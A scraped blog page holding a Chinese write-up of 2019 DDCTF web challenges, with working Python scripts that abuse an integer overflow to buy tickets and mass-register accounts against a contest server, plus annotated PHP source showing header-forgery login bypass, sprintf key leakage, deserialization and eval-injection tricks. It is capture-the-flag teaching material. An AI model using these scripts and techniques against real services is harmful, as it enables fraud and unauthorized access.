传参即可。\n大吉大利今晚吃鸡 遇到买东西的题目首先思路就是改变价格，通过抓包发现价格可以往大改而不能往小改。可以利用整数溢出0xffffffff+1，传参进去就买到了。 然后要淘汰100个人，实际上要淘汰149个人。脚本如下：\nimport requests import string import random import json import re url = 'http://117.51.147.155:5050' seq = [ 'register', 'login', 'balance', 'search_ticket', 'bill', 'buy', 'bill', 'pay'] url_seg = { 'register':'/ctf/api/register?name={0}\u0026password=11111111', 'login':'/ctf/api/login?name={0}\u0026password=11111111', 'balance':'/ctf/api/get_user_balance', 'search_ticket':'/ctf/api/search_ticket', 'bill':'/ctf/api/search_bill_info', 'buy':'/ctf/api/buy_ticket?ticket_price=4294967296', 'remove':'/ctf/api/remove_robot?id={0}\u0026ticket={1}', 'pay':'/ctf/api/pay_ticket?bill_id={0}'} session = requests.session() victiom ={ 1: '21cb23b38e33426812d68991dbb6ba68', 2: '6f89be1e66c9bd69bce99952aa009a96', 3: '70e1b0196609646efd0aacea613943d6', 4: '46f7f7e50b54a636f3aae60dd839590b', 5: '395b9fb4fb0f3cf42a727d43536be457', ··· ··· 147: '4cc522f84f11189d9737ab18fc22fcd0', 148: '8f2675372aa0f2ecfee1aeeee3d814cd', 149: '7544b9ee45ae6ae7066305d472077638'} def register_login_get_ticket(): global victiom global session while True: username = random.sample(string.letters, 19) username1 = ''.join(username) register1 = url_seg['register'].format(str(username1)) reg_url = url + register1 print reg_url res = session.get(reg_url).content if '\\u7528\\u6237\\u6ce8\\u518c\\u6210\\u529f' in res: log_url = url + url_seg['login'].format(username1) session.get(log_url) buy_url = url + url_seg['buy'] res = session.get(buy_url).content bill_url = url + url_seg['bill'] html = session.get(bill_url) jsonn = json.loads(html.text) bill_id = jsonn['data'][0]['bill_id'] pay_url = url + url_seg['pay'].format(bill_id) session.get(pay_url) sear_url = url + url_seg['search_ticket'] html = session.get(sear_url) res = html.content josnn = json.loads(html.text) id = josnn['data'][0]['id'] # 这个地方有点奇怪，josn解析不出ticket所以采用正则匹配的方式 ticket = re.search(\"ticket\\\":\\\"(.*?)\\\"\", res).group(1) victiom[id] = ticket print victiom if len(victiom) == 149: break def delete_other(): session = requests.session() regiter1 = url_seg['register'].format('ch5ser_cqw_cq') reg_url = url + regiter1 res = session.get(reg_url).content if '\\u7528\\u6237\\u6ce8\\u518c\\u6210\\u529f' in res: log_url = url + url_seg['login'].format('ch5ser_cqw_cq') session.get(log_url) buy_url = url + url_seg['buy'] res = session.get(buy_url).content bill_url = url + url_seg['bill'] html = session.get(bill_url) jsonn = json.loads(html.text) bill_id = jsonn['data'][0]['bill_id'] pay_url = url + url_seg['pay'].format(bill_id) session.get(pay_url) sear_url = url + url_seg['search_ticket'] html = session.get(sear_url) for key, value in victiom.items(): remove = url_seg['remove'].format(str(key), value) rem_url = url + remove print session.get(rem_url).content print session.get(\"http://117.51.147.155:5050/ctf/api/get_flag\").content def main(): # 注册过快可能会被封 register_login_get_ticket() delete_other() if __name__ == '__main__': main() 学长的脚本\nimport requests import json def reg(): for i in range(0,1000): url = \"http://117.51.147.155:5050/ctf/api/register?name=cic\"+str(i)+\"\u0026password=12345678\" html = requests.get(url) print(html.text) def get_ticket(i): s = requests.session() s.get(\"http://117.51.147.155:5050/ctf/api/login?name=cic\"+str(i)+\"\u0026password=12345678\") html = s.get(\"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296\") json1 = json.loads(html.text) ticketid = json1[\"data\"][0][\"bill_id\"] html1 = s.get(\"http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=\"+ticketid) html2 = s.get(\"http://117.51.147.155:5050/ctf/api/search_ticket\") json2 = json.loads(html2.text) id = json2[\"data\"][0][\"id\"] ticket = json2[\"data\"][0][\"ticket\"] pack = {\"id\":id , \"ticket\":ticket} return pack def del_people(id,ticket): s = requests.session() s.get(\"http://117.51.147.155:5050/ctf/api/login?name=cic\u0026password=12345678\") html = s.get(\"http://117.51.147.155:5050/ctf/api/remove_robot?id=\"+str(id)+\"\u0026ticket=\"+ticket) print(html.text) if __name__ == '__main__': reg() #get_ticket() for i in range(0,1000): pack = get_ticket(i) id = pack[\"id\"] ticket = pack[\"ticket\"] print(id) print(ticket) del_people(id, ticket) #del_people(id,ticket) 滴 沙雕题目，要读取的文件.practice.txt.swp在线索网址的作者的另一篇博客中出现过，读取，获得源码，传递引用就可以了\n图片上传 上传一张图片，提示缺少字段phpinfo(),并显示出了上传后的图片，下载后放入010editor中比较发现文件被改动，比较发现特定位置上的字节并没有被改动，在该位置后面添加phpinfo()上传就有flag了。\nhomebrew event loop read the source code first\n# -*- encoding: utf-8 -*- # written in python 3.7 __author__ = 'garzon' from flask import Flask, session, request, Response import urllib app = Flask(__name__) app.secret_key = '*********************' # censored url_prefix = '/d5af31f66741e857' def FLAG(): return 'FLAG_is_here_but_i_wont_show_you' # censored # put event in a queue def trigger_event(event): session['log'].append(event) if len(session['log']) \u003e 5: session['log'] = session['log'][-5:] if type(event) == type([]): request.event_queue += event else: request.event_queue.append(event) # get the string between prefix and postfix def get_mid_str(haystack, prefix, postfix=None): haystack = haystack[haystack.find(prefix)+len(prefix):] if postfix is not None: haystack = haystack[:haystack.find(postfix)] return haystack class RollBackException: pass def execute_event_loop(): valid_event_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#') resp = None # handle a event everytime while len(request.event_queue) \u003e 0: event = request.event_queue[0] # `event` is something like \"action:ACTION;ARGS0#ARGS1#ARGS2......\" request.event_queue = request.event_queue[1:] if not event.startswith(('action:', 'func:')): continue for c in event: if c not in valid_event_chars: break else: is_action = event[0] == 'a' action = get_mid_str(event, ':', ';') args = get_mid_str(event, action+';').split('#') try: # trigger_event%23;get_flag # 这个地方有意思，%23也就是井号是在拼接之后在eval的时候才触发的，而不是在拼接的时候立刻触发。而从下面来看，似乎井号的触发范围也封装在了event_handle里面了，而不会影响范围外的执行。 event_handler = eval(action + ('_handler' if is_action else '_function')) ret_val = event_handler(args) except RollBackException: if resp is None: resp = '' resp += 'ERROR! All transactions have been cancelled. ' resp += 'Go back to index.html\n' session['num_items'] = request.prev_session['num_items'] session['points'] = request.prev_session['points'] break except Exception, e: if resp is None: resp = '' #resp += str(e) # only for debugging continue if ret_val is not None: if resp is None: resp = ret_val else: resp += ret_val if resp is None or resp == '': resp = ('404 NOT FOUND', 404) session.modified = True return resp @app.route(url_prefix+'/') def entry_point(): querystring = urllib.unquote(request.query_string) request.event_queue = [] if querystring == '' or (not querystring.startswith('action:')) or len(querystring) \u003e 100: querystring = 'action:index;False#False' if 'num_items' not in session: session['num_items'] = 0 session['points'] = 3 session['log'] = [] request.prev_session = dict(session) trigger_event(querystring) return execute_event_loop() # handlers/functions below -------------------------------------- def view_handler(args): page = args[0] html = '' html += '[INFO] you have {} diamonds, {} points now.\n'.format(session['num_items'], session['points']) if page == 'index': html += '",
  "wordCount" : "1385",
  "inLanguage": "en",
  "image":"http://blog.dragonbox.top/image-20211114142123083.png","datePublished": "2019-05-11T13:58:05Z",
  "dateModified": "2019-05-11T13:58:05Z",
  "author":{
    "@type": "Person",
    "name": "ch3n9w"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://blog.dragonbox.top/posts/ctf-2019-ddctf-web/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "ch3n9w の 超元域",
    "logo": {
      "@type": "ImageObject",
      "url": "http://blog.dragonbox.top/flash.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://blog.dragonbox.top/" accesskey="h" title="ch3n9w の 超元域 (Alt + H)">
                <img src="http://blog.dragonbox.top/avatar.jpg" alt="" aria-label="logo"
                    height="35">ch3n9w の 超元域</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://blog.dragonbox.top/categories/" title="categories">
                    <span>categories</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://blog.dragonbox.top/">Home</a>&nbsp;»&nbsp;<a href="http://blog.dragonbox.top/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      2019 DDCTF web
    </h1>
    <div class="post-meta"><span title='2019-05-11 13:58:05 +0000 UTC'>May 11, 2019</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;1385 words&nbsp;·&nbsp;ch3n9w

</div>
  </header> 
<figure class="entry-cover">
        <img loading="eager" srcset="http://blog.dragonbox.top/posts/ctf-2019-ddctf-web/image-20211114142123083_hu14124345416118700756.png 360w ,http://blog.dragonbox.top/posts/ctf-2019-ddctf-web/image-20211114142123083_hu13734313669400506323.png 480w ,http://blog.dragonbox.top/posts/ctf-2019-ddctf-web/image-20211114142123083_hu13677728818500619037.png 720w ,http://blog.dragonbox.top/posts/ctf-2019-ddctf-web/image-20211114142123083_hu8167459465426229859.png 1080w ,http://blog.dragonbox.top/posts/ctf-2019-ddctf-web/image-20211114142123083.png 1381w" 
            sizes="(min-width: 768px) 720px, 100vw" src="http://blog.dragonbox.top/posts/ctf-2019-ddctf-web/image-20211114142123083.png" alt="" 
            width="1381" height="591">
        
</figure><div class="toc">
    <details  open>
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><nav id="TableOfContents">
  <ul>
    <li><a href="#web-签到题">web 签到题</a></li>
    <li><a href="#大吉大利今晚吃鸡">大吉大利今晚吃鸡</a></li>
    <li><a href="#滴">滴</a></li>
    <li><a href="#图片上传">图片上传</a></li>
    <li><a href="#homebrew-event-loop">homebrew event loop</a></li>
    <li><a href="#mysql弱口令">mysql弱口令</a></li>
    <li><a href="#wireshark">wireshark</a></li>
  </ul>
</nav>
        </div>
    </details>
</div>

  <div class="post-content"><p>考试周结束，有时间来复现了。。。然鹅好像有题目崩了，java又没学过。。。只能复现一部分了。</p>
<h2 id="web-签到题">web 签到题<a hidden class="anchor" aria-hidden="true" href="#web-签到题">#</a></h2>
<p>点击，扫描，发现除了index.php 之外其他都需要登陆，抓包发现有发送<code>Auth.php</code>请求，其中有<code>didictf_username</code>字段，尝试添加成为<code>didictf_username: admin</code>。成功登陆。</p>
<p>然后在返回包中显示出了一个<code>php文件</code>，尝试访问看到了<code>Session.php</code>的源代码如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Class</span> <span style="color:#a6e22e">Application</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> $path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">response</span>($data, $errMsg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;success&#39;</span>) {
</span></span><span style="display:flex;"><span>      $ret <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;errMsg&#39;</span> <span style="color:#f92672">=&gt;</span> $errMsg,
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#39;data&#39;</span> <span style="color:#f92672">=&gt;</span> $data];
</span></span><span style="display:flex;"><span>      $ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_encode</span>($ret);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-type: application/json&#39;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">echo</span> $ret;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">auth</span>() {
</span></span><span style="display:flex;"><span>      $DIDICTF_ADMIN <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;admin&#39;</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_SERVER[<span style="color:#e6db74">&#39;HTTP_DIDICTF_USERNAME&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> $_SERVER[<span style="color:#e6db74">&#39;HTTP_DIDICTF_USERNAME&#39;</span>] <span style="color:#f92672">==</span> $DIDICTF_ADMIN) {
</span></span><span style="display:flex;"><span>          $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">response</span>(<span style="color:#e6db74">&#39;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&#39;</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">TRUE</span>;
</span></span><span style="display:flex;"><span>      }<span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>          $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">response</span>(<span style="color:#e6db74">&#39;抱歉，您没有登陆权限，请获取权限后访问-----&#39;</span>,<span style="color:#e6db74">&#39;error&#39;</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">exit</span>();
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">sanitizepath</span>($path) {
</span></span><span style="display:flex;"><span>  $path <span style="color:#f92672">=</span> <span style="color:#a6e22e">trim</span>($path);<span style="color:#75715e">//去掉空格
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  $path<span style="color:#f92672">=</span><span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;../&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>,$path);<span style="color:#75715e">//过滤第一
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  $path<span style="color:#f92672">=</span><span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;..\\&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>,$path);<span style="color:#75715e">//过滤第二
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">return</span> $path;
</span></span><span style="display:flex;"><span>}<span style="color:#75715e">//
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __destruct() {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">empty</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">path</span>)) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">exit</span>();
</span></span><span style="display:flex;"><span>  }<span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>      $path <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">sanitizepath</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">path</span>);<span style="color:#75715e">// ....//config/flag.php
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strlen</span>($path) <span style="color:#f92672">!==</span> <span style="color:#ae81ff">18</span>) {<span style="color:#75715e">//../config/flag.php
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>          <span style="color:#66d9ef">exit</span>();
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">response</span>($data<span style="color:#f92672">=</span><span style="color:#a6e22e">file_get_contents</span>($path),<span style="color:#e6db74">&#39;Congratulations&#39;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">exit</span>();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;?php
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">include &#39;Application.php&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">class Session extends Application {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  //key建议为8位字符串
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  var $eancrykey                  = &#39;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  var $cookie_expiration			= 7200;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  var $cookie_name                = &#39;ddctf_id&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  var $cookie_path				= &#39;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  var $cookie_domain				= &#39;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  var $cookie_secure				= FALSE;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  var $activity                   = &#34;DiDiCTF&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  public function index()
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">	if(parent::auth()) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          $this-&gt;get_key();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          if($this-&gt;session_read()) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">              $data = &#39;DiDI Welcome you %s&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">              $data = sprintf($data,$_SERVER[&#39;HTTP_USER_AGENT&#39;]);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">              parent::response($data,&#39;sucess&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          }else{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">              $this-&gt;session_create();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">              $data = &#39;DiDI Welcome you&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">              parent::response($data,&#39;sucess&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  private function get_key() {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      //eancrykey  and flag under the folder
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      $this-&gt;eancrykey =  file_get_contents(&#39;../config/key.txt&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  public function session_read() {//target1: 绕过所有false
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      if(empty($_COOKIE)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">           return FALSE;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      }//cookie not empty
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      $session = $_COOKIE[$this-&gt;cookie_name];
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      if(!isset($session)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          parent::response(&#34;session not found&#34;,&#39;error&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          return FALSE;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      }//ddctf_id 不能为空
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      $hash = substr($session,strlen($session)-32);//长度要大于32? 32位之后的内容
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      $session = substr($session,0,strlen($session)-32);//一直截断到倒数第32位
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      if($hash !== md5($this-&gt;eancrykey.$session)) {//key.txt 内容和 ddctf_id 内容片段拼接 再md5 等于ddctf_id32位之后的内容
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          parent::response(&#34;the cookie data not match&#34;,&#39;error&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          return FALSE;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      $session = unserialize($session);//ddctf_id 反序列化
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      if(!is_array($session) OR !isset($session[&#39;session_id&#39;]) OR !isset($session[&#39;ip_address&#39;]) OR !isset($session[&#39;user_agent&#39;])){
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          return FALSE;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      }//ddctf_id 反序列化之后的内容要有 session_id ip_address user_agent 再来个path??
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      if(!empty($_POST[&#34;nickname&#34;])) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          $arr = array($_POST[&#34;nickname&#34;],$this-&gt;eancrykey);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          $data = &#34;Welcome my friend %s&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          foreach ($arr as $k =&gt; $v) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">              $data = sprintf($data,$v);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          parent::response($data,&#34;Welcome&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      }//sprint格式化打印函数利用，通过传递进参数nickname = %S 让它可以读取key。
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      if($session[&#39;ip_address&#39;] != $_SERVER[&#39;REMOTE_ADDR&#39;]) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          parent::response(&#39;the ip addree not match&#39;.&#39;error&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          return FALSE;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      }//ip_address 要写自己的ip
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      if($session[&#39;user_agent&#39;] != $_SERVER[&#39;HTTP_USER_AGENT&#39;]) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          parent::response(&#39;the user agent not match&#39;,&#39;error&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          return FALSE;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      }//user_agent 内容要和 http_user_agent的匹配
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      return TRUE;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  }//看起来可以动手脚的只有session_id?
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  private function session_create() {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      $sessionid = &#39;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      while(strlen($sessionid) &lt; 32) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          $sessionid .= mt_rand(0,mt_getrandmax());
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      $userdata = array(
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          &#39;session_id&#39; =&gt; md5(uniqid($sessionid,TRUE)),
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          &#39;ip_address&#39; =&gt; $_SERVER[&#39;REMOTE_ADDR&#39;],
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          &#39;user_agent&#39; =&gt; $_SERVER[&#39;HTTP_USER_AGENT&#39;],
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          &#39;user_data&#39; =&gt; &#39;&#39;,
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      );
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      $cookiedata = serialize($
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  );
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      $expire = $this-&gt;cookie_expiration + time();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">      setcookie(
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          $this-&gt;cookie_name,
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          $cookiedata,
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          $expire,
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          $this-&gt;cookie_path,
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          $this-&gt;cookie_domain,
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          $this-&gt;cookie_secure
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          );
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
